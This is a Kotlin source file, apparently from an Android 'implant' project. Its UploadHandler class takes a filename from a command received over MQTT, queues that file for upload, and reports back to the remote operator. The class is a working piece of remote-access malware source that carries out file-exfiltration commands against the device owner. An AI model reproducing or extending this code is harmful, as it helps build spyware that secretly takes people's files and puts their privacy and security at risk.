package com.cooperthecoder.implant.command.handlers

import android.content.Context
import com.cooperthecoder.implant.command.Command
import com.cooperthecoder.implant.data.UploadQueue
import org.eclipse.paho.android.service.MqttAndroidClient

class UploadHandler(context: Context, client: MqttAndroidClient, command: Command) : CommandHandler(context, client, command) {

    override fun action() {
        val filename = command.arguments["filename"]
        if (filename == null) {
            reply("", "Required argument: filename")
            return
        }

        try {
            UploadQueue.push(filename)
        } catch (e: Exception) {
            reply("", "Error: ${e.message}")
            return
        }

        reply("$filename queued for upload.", "")
    }
}